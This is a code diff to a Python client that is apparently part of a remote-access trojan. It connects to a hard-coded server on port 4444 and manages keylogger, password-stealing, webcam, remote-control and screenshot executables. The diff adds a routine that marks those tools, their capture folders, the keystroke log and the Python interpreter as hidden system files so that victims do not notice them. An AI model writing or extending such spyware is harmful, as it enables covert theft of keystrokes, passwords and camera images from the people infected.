@@ -5,6 +5,7 @@ import threading
 import os
 import sys
 import time
+import ctypes
 
 SERVER_IP = "192.168.206.1"
 SERVER_PORT = 4444
@@ -20,6 +21,15 @@ WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
 KEYLOG_FILE = os.path.join(BASE_DIR, "keylogs.txt")
 REMOTE_EXE= os.path.join(BASE_DIR, "remote.exe")
 SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot.exe")
+CAPTURE_DIR = os.path.join(BASE_DIR, "captures")
+SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshot")
+
+
+def hide_file(path):
+    FILE_ATTRIBUTE_HIDDEN = 0x02
+    FILE_ATTRIBUTE_SYSTEM = 0x04
+    attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
+    ctypes.windll.kernel32.SetFileAttributesW(path, attrs)
 
 def send_file(client_socket, file_path, file_type):
     try:
@@ -106,6 +116,12 @@ def handle_commands(client_socket):
 
 
 def main():
+
+        # Cacher les exécutables
+    for exe in [KEYLOGGER_EXE, PASSWORD_EXE, WEBCAM_EXE, REMOTE_EXE, SCREENSHOT_EXE,KEYLOG_FILE,SCREENSHOT_DIR,CAPTURE_DIR, sys.executable]:
+        if os.path.exists(exe):
+            hide_file(exe)
+
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((SERVER_IP, SERVER_PORT))
 
